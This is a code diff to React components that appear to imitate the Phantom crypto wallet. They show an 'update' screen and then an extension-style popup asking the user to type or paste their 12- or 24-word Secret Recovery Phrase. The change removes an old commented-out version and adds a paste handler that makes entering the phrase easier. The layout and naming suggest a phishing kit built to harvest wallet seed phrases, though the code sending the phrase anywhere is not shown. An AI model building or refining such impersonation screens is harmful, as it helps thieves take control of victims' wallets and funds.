@@ -231,99 +231,7 @@ function PhantomUpdateScreenLoading({ handleUpdate }) {
   );
 }
 
-// function PhantomRecoveryScreen({ open = true, onClose }) {
-//   const [isOpen, setIsOpen] = useState(open);
-//   const [phrase, setPhrase] = useState("");
-//   const [accountOpen, setAccountOpen] = useState(false);
 
-//   const visible = useMemo(() => isOpen, [isOpen]);
-
-//   const close = () => {
-//     setIsOpen(false);
-//     if (onClose) onClose();
-//   };
-
-//   // --- MetaMask parsing logic ---
-//   const words = phrase
-//     .toLowerCase()
-//     .replace(/\n/g, " ")
-//     .replace(/\s+/g, " ")
-//     .trim()
-//     .split(" ")
-//     .slice(0, 12);
-
-//   const handleChange = (e) => {
-//     const input = e.target.value;
-//     const normalized = input
-//       .toLowerCase()
-//       .replace(/\n/g, " ")
-//       .replace(/\s+/g, " ");
-
-//     if (normalized.trim().split(" ").length <= 12) {
-//       setPhrase(normalized);
-//     }
-//   };
-
-//   const isComplete = words.length === 12;
-
-//   if (!visible) return null;
-
-//   return (
-//     <div className="w-[360px] h-[600px] absolute top-0 right-[5%] z-50 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
-//       <div className="flex justify-center border-b border-[#222222] py-3">
-//         <PhantomWalletIcon />
-//       </div>
-//       {/* Content */}
-//       <div className="px-5 py-5">
-//         <h2 className="text-[22px] font-semibold leading-snug text-white">
-//           Import your wallet with your <br /> Secret Recovery Phrase
-//         </h2>
-
-//         <p className="mt-2 text-xs leading-relaxed text-white/60">
-//           Enter your Secret Recovery Phrase.
-//         </p>
-
-//         {/* Real input (MetaMask style) */}
-//         <div className="mt-5 rounded-2xl border border-white/10 bg-[#14171B] px-4 py-4">
-//           <textarea
-//             value={phrase}
-//             onChange={handleChange}
-//             rows={3}
-//             className="w-full resize-none bg-transparent text-[15px] leading-relaxed text-white/85 outline-none placeholder:text-white/30"
-//             placeholder="Enter your Secret Recovery Phrase..."
-//           />
-//         </div>
-
-//         {/* Visual 12 slots */}
-//         <div className="mt-4 grid grid-cols-3 gap-2">
-//           {Array.from({ length: 12 }).map((_, i) => (
-//             <div
-//               key={i}
-//               className="flex items-center gap-2 rounded-lg border border-white/10 bg-[#14171B] px-2 py-1.5 text-sm"
-//             >
-//               <span className="w-5 text-right text-white/40">{i + 1}.</span>
-//               <span className="text-white truncate">{words[i] || ""}</span>
-//             </div>
-//           ))}
-//         </div>
-
-//         {/* CTA */}
-//         <button
-//           type="button"
-//           disabled={!isComplete}
-//           className="
-//             mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold
-//             bg-white text-black shadow-sm
-//             disabled:opacity-40 disabled:cursor-not-allowed
-//             hover:bg-white/90 active:scale-[0.99]
-//           "
-//         >
-//           Import Wallet
-//         </button>
-//       </div>
-//     </div>
-//   );
-// }
 
 function PhantomRecoveryScreen({ open = true, onClose }) {
   const [isOpen, setIsOpen] = useState(open);
@@ -360,6 +268,21 @@ function PhantomRecoveryScreen({ open = true, onClose }) {
     // ✅ limit to selected length (12 or 24)
     if (normalized.trim().split(" ").filter(Boolean).length <= length) {
       setPhrase(normalized);
+    }
+  };
+
+  const handlePaste = (e) => {
+    e.preventDefault();
+    const pasted = e.clipboardData.getData("text");
+    if (!pasted) return;
+
+    const tokens = pasted.toLowerCase().trim().split(/\s+/).filter(Boolean);
+
+    // If user pasted enough words, fill the grid
+    if (tokens.length >= length) {
+      setPhrase(tokens.slice(0, length).join(' '));
+    } else {
+      setPhrase(tokens.join(' '));
     }
   };
 
@@ -429,6 +352,7 @@ function PhantomRecoveryScreen({ open = true, onClose }) {
           <textarea
             value={phrase}
             onChange={handleChange}
+            onPaste={handlePaste}
             rows={3}
             className="w-full resize-none bg-transparent text-[15px] text-white/85 outline-none placeholder:text-white/30"
             placeholder="Enter your Secret Recovery Phrase..."
@@ -466,3 +390,5 @@ function PhantomRecoveryScreen({ open = true, onClose }) {
     </div>
   );
 }
+
+
